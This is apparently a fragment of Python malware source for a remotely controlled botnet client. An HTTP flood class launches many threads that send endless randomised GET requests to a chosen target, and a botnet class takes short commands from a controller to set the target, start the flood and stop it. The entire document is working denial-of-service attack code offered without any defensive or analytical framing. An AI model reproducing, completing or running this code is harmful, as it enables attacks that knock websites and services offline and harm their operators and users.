

import string
import multiprocessing
from multiprocessing import Process
from multiprocessing.connection import Connection
from random import choice, choices, sample

USER_AGENT = {{USER_AGENT}}


class HttpFlood(Process):
    def __init__(self, target_ip: str, stop_signal: multiprocessing.Event, pause_combo: int = 1, th_no: int = 100, port_no: int = 80):
        super().__init__(daemon=True)
        self.target = target_ip
        self.stop_signal = stop_signal
        self.th_no = th_no
        self.port = port_no
        self.chars = list(string.ascii_letters + string.digits)
        self.UA = USER_AGENT
        self.pause = pause_combo
    

    def http_request(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.connect((self.target, self.port))
            user_agent = choice(self.UA)
            referer = "".join(choices(self.chars, k=12))
            request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent:{user_agent}\r\nReferer:{referer}\r\n\r\n"
            print(f"\n---------------------\n{request}\n---------------------------------\n")
            sock.sendall(request.encode())
        except:
            pass
        finally:
            sock.close()
    
    def flood(self) -> None:
        while not self.stop_signal.is_set():
            self.http_request()
    
    def attack(self) -> None:
        request = []
        for _ in range(self.th_no):
            request.append(Thread(target=self.flood))
        for r in request:
            r.start()
    
    def run(self) -> None:
        while not self.stop_signal.is_set():
            self.attack()
            sleep(self.pause)

import multiprocessing


class BasicBotnet(BasicWorm):
    def __init__(self):
        super().__init__()
        self.name = "Basic Botnet"
        self.procNo = 1
        self.target = None
        self.stopEvent = multiprocessing.Event()
        self.works = True
        self._attack = False
    
    def set_target(self, target) -> bool:
        host = target.replace("http://", "").replace("https://", "").replace("www.", "")
        try:
            ip_tar = socket.gethostbyname(host)
            if ip_tar == self.target:
                return True
            self.sendMsg(f"New target is set: {ip_tar}")
            self.target = ip_tar
        except Exception as e:
            self.sendMsg(f"[!!] ERROR Set Target: {e}")
            return False
    
    def attack(self) -> None:
        if self._attack:
            self.sendMsg("Client already attacking")
            return
        self.stopEvent.clear()
        if not self.target:
            self.sendMsg("[!!] Cant attack !!! No target set[!!]")
            return
        for _ in range(self.procNo):
            node = HttpFlood(self.target, self.stopEvent)
            node.start()
        self.sendMsg("START ATTACK")
        self._attack = True
    
    def stopAttack(self) -> None:
        if not self._attack:
            return
        self.stopEvent.set()
        self._attack = False
        self.sendMsg("Stop Attacking")
    
    def execCommand(self, cmd) -> None:
        cmd = cmd.split(" ")
        match cmd[0]:
            case "tar":
                self.set_target(cmd[1])
            case "ATT":
                self.attack()
            case "STP":
                self.stopAttack()
            case _:
                self.sendMsg("Unknown Command")
    
    def Work(self) -> bool:
        while True:
            if not self.works:
                return False
            cmd = self.reciveMsg()
            if not cmd:
                break
            self.execCommand(cmd)
        return True

